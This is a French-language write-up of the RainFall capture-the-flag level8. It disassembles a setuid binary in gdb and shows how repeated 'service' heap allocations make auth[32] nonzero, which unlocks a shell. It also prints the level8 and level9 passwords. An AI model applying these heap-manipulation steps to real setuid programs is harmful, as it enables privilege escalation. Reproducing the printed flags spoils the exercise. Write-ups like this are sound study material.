## 1: Analyse

### A: C'est quoi mon binaire?

  ```shell
  # On se connecte si c'est pas déja fait via le level7
  $ ssh level8@127.0.0.1 -p 4242
     _____       _       ______    _ _
    |  __ \     (_)     |  ____|  | | |
    | |__) |__ _ _ _ __ | |__ __ _| | |
    |  _  /  _` | | '_ \|  __/ _` | | |
    | | \ \ (_| | | | | | | | (_| | | |
    |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                  Good luck & Have fun

    To start, ssh with level0/level0 on 10.0.2.15:4242
  level8@127.0.0.1's password 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
  [...]
  level8@RainFall:~$
  
  # On regarde ce qu'on a
  level8@RainFall:~$ ls -la
    total 17
    dr-xr-x---+ 1 level8 level8   80 Mar  6  2016 .
    dr-x--x--x  1 root   root    340 Sep 23  2015 ..
    -rw-r--r--  1 level8 level8  220 Apr  3  2012 .bash_logout
    -rw-r--r--  1 level8 level8 3530 Sep 23  2015 .bashrc
    -rwsr-s---+ 1 level9 users  6057 Mar  6  2016 level8
    -rw-r--r--+ 1 level8 level8   65 Sep 23  2015 .pass
    -rw-r--r--  1 level8 level8  675 Apr  3  2012 .profile

  # On teste les arguments
  level8@RainFall:~$ ./level8
    (nil), (nil)
    nil nil
    (nil), (nil)
    test test
    (nil), (nil)
    test test
    (nil), (nil)
    1 2
    (nil), (nil)
    .
    .
    .
  ```
  * Avec ou sans arguments on tombe dans une boucle infinie qui print (nil), (nil)
  * Avec des gros arguments, ca ne segfault pas, mais ça fait plusieurs tours de boucle d'un coup, comme s'il ne lisait pas tout l'input a chaque fois.


### B: On l'ouvre avec gdb
  * On va dans tmp pour lancer avec peda qu'on a copié avec le setup.sh
  ```shell
    level8@RainFall:~$ cd /tmp
  ```

  * On lance gdb avec notre binaire
  ```shell
    level8@RainFall:/tmp$ gdb ~/level8
      [...]
      Reading symbols from /home/user/level8/level8...(no debugging symbols found)...done.
  ```

  * Qu'est-ce qu'on a comme fonctions?
  ```shell
    gdb-peda$ info functions
      All defined functions:

      Non-debugging symbols:
      0x080483c4  _init
      0x08048410  printf
      0x08048410  printf@plt
      0x08048420  free
      0x08048420  free@plt
      0x08048430  strdup
      0x08048430  strdup@plt
      0x08048440  fgets
      0x08048440  fgets@plt
      0x08048450  fwrite
      0x08048450  fwrite@plt
      0x08048460  strcpy
      0x08048460  strcpy@plt
      0x08048470  malloc
      0x08048470  malloc@plt
      0x08048480  system
      0x08048480  system@plt
      0x08048490  __gmon_start__
      0x08048490  __gmon_start__@plt
      0x080484a0  __libc_start_main
      0x080484a0  __libc_start_main@plt
      0x080484b0  _start
      0x080484e0  __do_global_dtors_aux
      0x08048540  frame_dummy # Func habituelles
      0x08048564  main        # Func habituelles
      0x08048740  __libc_csu_init
      0x080487b0  __libc_csu_fini
      0x080487b2  __i686.get_pc_thunk.bx
      0x080487c0  __do_global_ctors_aux
      0x080487ec  _fini
  ```

  * Commandes lancées pendant l'analyse du binaire ci-dessous
  ```shell
    gdb-peda$ x/s 0x8049ab0
      0x8049ab0 <service>:	 ""
    
    gdb-peda$ x/s 0x8049aac
      0x8049aac <auth>:	 ""
    
    gdb-peda$ x/s 0x8048810
      0x8048810:	 "%p, %p \n"

    gdb-peda$ x/s 0x8049a80
      0x8049a80 <stdin@@GLIBC_2.0>:	 ""

    gdb-peda$ x/s 0x8048819
      0x8048819:	 "auth "

    gdb-peda$ x/s 0x804881f
      0x804881f:	 "reset"

    gdb-peda$ x/s 0x8048825
      0x8048825:	 "service"

    gdb-peda$ x/s 0x804882d
      0x804882d:	 "login"

    gdb-peda$ x/s 0x8048833
      0x8048833:	 "/bin/sh"

    gdb-peda$ x/s 0x8049aa0
      0x8049aa0 <stdout@@GLIBC_2.0>:	 ""

    gdb-peda$ x/s 0x804883b
      0x804883b:	 "Password:\n"
  ```

  * [Reference pour comprendre cmps](https://www.tutorialspoint.com/assembly_programming/assembly_cmps_instruction.htm)
  * On disassemble main pour regarder le code
  ```shell
    gdb-peda$ pdisas mainDump of assembler code for function main:
    # Le fichier est bien trop long pour que je fasse toutes les lignes qui ne sont pas forcément utiles ici.
    # Je vais donc juste annoter les blocs et annoter les nouvelles lignes

    # Init, sauvegarde edi (destination index), esi (source index), alignement de la mémoire, allocation de 160
    0x08048564 <+0>:	    push   ebp
    0x08048565 <+1>:	    mov    ebp,esp
    0x08048567 <+3>:	    push   edi
    0x08048568 <+4>:	    push   esi
    0x08048569 <+5>:	    and    esp,0xfffffff0
    0x0804856c <+8>:	    sub    esp,0xa0

    0x08048572 <+14>:	    jmp    0x8048575 <main+17>  # Jump inutile puisqu'il saute une instruction 
    0x08048574 <+16>:	    nop                         # Instruction qui ne fait rien

    # Call printf("%p, %p \n", service, auth) => c'est la qu'on a le "(nip), (nip)\n"
    0x08048575 <+17>:	    mov    ecx,DWORD PTR ds:0x8049ab0
    0x0804857b <+23>:	    mov    edx,DWORD PTR ds:0x8049aac
    0x08048581 <+29>:	    mov    eax,0x8048810
    0x08048586 <+34>:	    mov    DWORD PTR [esp+0x8],ecx
    0x0804858a <+38>:	    mov    DWORD PTR [esp+0x4],edx
    0x0804858e <+42>:	    mov    DWORD PTR [esp],eax
    0x08048591 <+45>:	    call   0x8048410 <printf@plt>

    # Call fgets(buffer[160 - 32], 128, stdin)
    0x08048596 <+50>:	    mov    eax,ds:0x8049a80
    0x0804859b <+55>:	    mov    DWORD PTR [esp+0x8],eax
    0x0804859f <+59>:	    mov    DWORD PTR [esp+0x4],0x80
    0x080485a7 <+67>:	    lea    eax,[esp+0x20]
    0x080485ab <+71>:	    mov    DWORD PTR [esp],eax
    0x080485ae <+74>:	    call   0x8048440 <fgets@plt>

    # Si le retour de fgets == 0, Jump a main+456 => On sort de la boucle quand on CTRL + D sur l'input
    0x080485b3 <+79>:	    test   eax,eax              # Pareil que "cmp eax, 0" mais est plus opti
    0x080485b5 <+81>:	    je     0x804872c <main+456>

    # Equivalent opti de strcmp("auth ", buffer[128]): repz fait avancer bit a bit les parametres et cmps compare et check si les 2 sont égaux ou = \0
    0x080485bb <+87>:	    lea    eax,[esp+0x20]
    0x080485bf <+91>:	    mov    edx,eax        # edx = buffer[128]
    0x080485c1 <+93>:	    mov    eax,0x8048819  # eax = "auth "
    0x080485c6 <+98>:	    mov    ecx,0x5        # ecx = 5
    0x080485cb <+103>:	mov    esi,edx          # esi = buffer[128]
    0x080485cd <+105>:	mov    edi,eax          # edi = "auth "
    0x080485cf <+107>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi] # cf. reference cmps

    # Les 2 lignes suivantes font partie du strcmp et checkent si le char de la source > ou = ou < au char de la dest sur lesquels on s'est arrêté
    0x080485d1 <+109>:	seta   dl                   # True if buffer[n] > "auth "[n]
    0x080485d4 <+112>:	setb   al                   # True if buffer[n] < "auth "[n]

    # Ici on compare le retour du strcmp et si buffer != "auth " jump main+222
    0x080485d7 <+115>:	mov    ecx,edx              # ecx = buffer[128]
    0x080485d9 <+117>:	sub    cl,al
    0x080485db <+119>:	mov    eax,ecx              # eax = buffer[128]
    0x080485dd <+121>:	movsx  eax,al               # On met al dans eax (movsx)
    0x080485e0 <+124>:	test   eax,eax              # Si eax (retour du strcmp) != 0
    0x080485e2 <+126>:	jne    0x8048642 <main+222> # Jump main+222

    # Si buffer[128] (notre input) == "auth ", ds:auth = malloc(4)
    0x080485e4 <+128>:	mov    DWORD PTR [esp],0x4
    0x080485eb <+135>:	call   0x8048470 <malloc@plt>
    0x080485f0 <+140>:	mov    ds:0x8049aac,eax

    # malloc(4)[0] = 0
    0x080485f5 <+145>:	mov    eax,ds:0x8049aac
    0x080485fa <+150>:	mov    DWORD PTR [eax],0x0

    # eax = strlen(buffer + 5)
    0x08048600 <+156>:	lea    eax,[esp+0x20]
    0x08048604 <+160>:	add    eax,0x5                          # eax = buffer + 5 (on pointe a la fin de "auth ")
    0x08048607 <+163>:	mov    DWORD PTR [esp+0x1c],0xffffffff  # Met -1 a ESP + 28
    0x0804860f <+171>:	mov    edx,eax                          # edx = buffer + 5
    0x08048611 <+173>:	mov    eax,0x0
    0x08048616 <+178>:	mov    ecx,DWORD PTR [esp+0x1c]         # Met ESP + 28 (&-1) dans ecx
    0x0804861a <+182>:	mov    edi,edx
    0x0804861c <+184>:	repnz scas al,BYTE PTR es:[edi]         # eax = strlen(buffer + 5)
    0x0804861e <+186>:	mov    eax,ecx
    0x08048620 <+188>:	not    eax
    0x08048622 <+190>:	sub    eax,0x1

    # if strlen(buffer +5) > 30 jump main+222
    0x08048625 <+193>:	cmp    eax,0x1e
    0x08048628 <+196>:	ja     0x8048642 <main+222>

    # Call strcpy(malloc(5), buffer + 5)
    0x0804862a <+198>:	lea    eax,[esp+0x20]
    0x0804862e <+202>:	lea    edx,[eax+0x5]
    0x08048631 <+205>:	mov    eax,ds:0x8049aac
    0x08048636 <+210>:	mov    DWORD PTR [esp+0x4],edx
    0x0804863a <+214>:	mov    DWORD PTR [esp],eax
    0x0804863d <+217>:	call   0x8048460 <strcpy@plt>

    # On arrive ici si buffer[:5] != "auth " ou si len(buffer[5:]) > 30
    # On l'a vu au main+87, on fait un if !strcmp(buffer, "reset") jump main+276
    0x08048642 <+222>:	lea    eax,[esp+0x20]
    0x08048646 <+226>:	mov    edx,eax
    0x08048648 <+228>:	mov    eax,0x804881f
    0x0804864d <+233>:	mov    ecx,0x5
    0x08048652 <+238>:	mov    esi,edx
    0x08048654 <+240>:	mov    edi,eax
    0x08048656 <+242>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
    0x08048658 <+244>:	seta   dl
    0x0804865b <+247>:	setb   al
    0x0804865e <+250>:	mov    ecx,edx
    0x08048660 <+252>:	sub    cl,al
    0x08048662 <+254>:	mov    eax,ecx
    0x08048664 <+256>:	movsx  eax,al
    0x08048667 <+259>:	test   eax,eax
    0x08048669 <+261>:	jne    0x8048678 <main+276>

    # Ici notre buffer[:5] = "reset"
    # On free le datasegment reset
    0x0804866b <+263>:	mov    eax,ds:0x8049aac
    0x08048670 <+268>:	mov    DWORD PTR [esp],eax
    0x08048673 <+271>:	call   0x8048420 <free@plt>

    # Jump from main+261
    # Again, un if !strcmp(buffer, "service") jump main+337
    0x08048678 <+276>:	lea    eax,[esp+0x20]
    0x0804867c <+280>:	mov    edx,eax
    0x0804867e <+282>:	mov    eax,0x8048825
    0x08048683 <+287>:	mov    ecx,0x6
    0x08048688 <+292>:	mov    esi,edx
    0x0804868a <+294>:	mov    edi,eax
    0x0804868c <+296>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
    0x0804868e <+298>:	seta   dl
    0x08048691 <+301>:	setb   al
    0x08048694 <+304>:	mov    ecx,edx
    0x08048696 <+306>:	sub    cl,al
    0x08048698 <+308>:	mov    eax,ecx
    0x0804869a <+310>:	movsx  eax,al
    0x0804869d <+313>:	test   eax,eax
    0x0804869f <+315>:	jne    0x80486b5 <main+337>

    # Ici buffer[:7] = "service"
    # On fait un ds:service = strdup(buffer[7:], "service")
    0x080486a1 <+317>:	lea    eax,[esp+0x20]
    0x080486a5 <+321>:	add    eax,0x7
    0x080486a8 <+324>:	mov    DWORD PTR [esp],eax
    0x080486ab <+327>:	call   0x8048430 <strdup@plt>
    0x080486b0 <+332>:	mov    ds:0x8049ab0,eax

    # Jump from main+315
    # If !strcmp(buffer, "login") jump main+16 (le début de notre boucle)
    0x080486b5 <+337>:	lea    eax,[esp+0x20]
    0x080486b9 <+341>:	mov    edx,eax
    0x080486bb <+343>:	mov    eax,0x804882d
    0x080486c0 <+348>:	mov    ecx,0x5
    0x080486c5 <+353>:	mov    esi,edx
    0x080486c7 <+355>:	mov    edi,eax
    0x080486c9 <+357>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
    0x080486cb <+359>:	seta   dl
    0x080486ce <+362>:	setb   al
    0x080486d1 <+365>:	mov    ecx,edx
    0x080486d3 <+367>:	sub    cl,al
    0x080486d5 <+369>:	mov    eax,ecx
    0x080486d7 <+371>:	movsx  eax,al
    0x080486da <+374>:	test   eax,eax
    0x080486dc <+376>:	jne    0x8048574 <main+16>

    # Ici buffer[:5] = "login"
    0x080486e2 <+382>:	mov    eax,ds:0x8049aac         # prend auth
    0x080486e7 <+387>:	mov    eax,DWORD PTR [eax+0x20] # On prend auth + 32
    0x080486ea <+390>:	test   eax,eax                  # if auth+32 == 0 jump main+411
    0x080486ec <+392>:	je     0x80486ff <main+411>

    # If auth[32] != 0 call system("/bin/sh")
    0x080486ee <+394>:	mov    DWORD PTR [esp],0x8048833
    0x080486f5 <+401>:	call   0x8048480 <system@plt>

    # Fin de la boucle on retourne en main+16
    0x080486fa <+406>:	jmp    0x8048574 <main+16>

    # Ici buffer[:5] = "login" et auth[32] == 0
    # Call fwrite("Password:\n", 1, 11, stdout)
    0x080486ff <+411>:	mov    eax,ds:0x8049aa0
    0x08048704 <+416>:	mov    edx,eax
    0x08048706 <+418>:	mov    eax,0x804883b
    0x0804870b <+423>:	mov    DWORD PTR [esp+0xc],edx
    0x0804870f <+427>:	mov    DWORD PTR [esp+0x8],0xa
    0x08048717 <+435>:	mov    DWORD PTR [esp+0x4],0x1
    0x0804871f <+443>:	mov    DWORD PTR [esp],eax
    0x08048722 <+446>:	call   0x8048450 <fwrite@plt>

    # Fin de la boucle on retourne en main+16
    0x08048727 <+451>:	jmp    0x8048574 <main+16>

    # Return 0
    0x0804872c <+456>:	nop
    0x0804872d <+457>:	mov    eax,0x0
    0x08048732 <+462>:	lea    esp,[ebp-0x8]
    0x08048735 <+465>:	pop    esi
    0x08048736 <+466>:	pop    edi
    0x08048737 <+467>:	pop    ebp
    0x08048738 <+468>:	ret
    End of assembler dump.
  ```

## 2: Comportement

  * Ok on a une grosse forêt de if qui va check a chaque tour de boucle l'input passé en paramètre et faire en conséquence:
    - En tout premier lieu, on print auth et service
    - Si l'input est "auth " + login avec len(login) < 30 on copie login dans la globale auth
    - Si l'input commence par "reset" on free auth (on le vide)
    - Si l'input est "service" + randomstring, on copie randomstring dans service
    - Si l'input est "login" et que auth[32] n'est pas vide, on lance un shell
    - Si l'input est "login" et que auth[32] est vide, on print "Password:\n"


## 3: Exploit

### A: Explication

> On voit que pour se login il faut reussir a ecrire plus de 32 char dans auth, ce qui n'est pas possible puisque le strcpy est protégé par un strlen et qu'on check qu'on ne dépasse pas les 30 caractères.
> En revanche, on va ajouter des malloc en appelant service. On devrait donc pouvoir overflow sur auth via service et ainsi écrire les caractères manquants pour le check du login

### B: Creation de l'exploit

* Testons un peu tout d'abord:
```shell
  gdb-peda$ run
    (nil), (nil)
  auth
    0x804a008, (nil)
  service
    0x804a008, 0x804a018
  [...]
```
> On voit logiquement que le strdup de service se fait plus loin dans la mémoire que le malloc de auth puisqu'il est fait après.\
> On est donc en train d'écrire dans auth et ça tombe bien, c'est ce qu'on cherche. Continuons alors !\

```shell
  [...]
  service
    0x804a008, 0x804a028
```
> Pouf on a donc bien écrit la suite de service 32 octets après. On essaye login?

```shell
  login
  $ whoami
    level9
  $ cat /home/user/level9/.pass
    c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
  level8@RainFall:/tmp$ su level9
  Password:
  RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
  No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level9/level9
  level9@RainFall:~$
```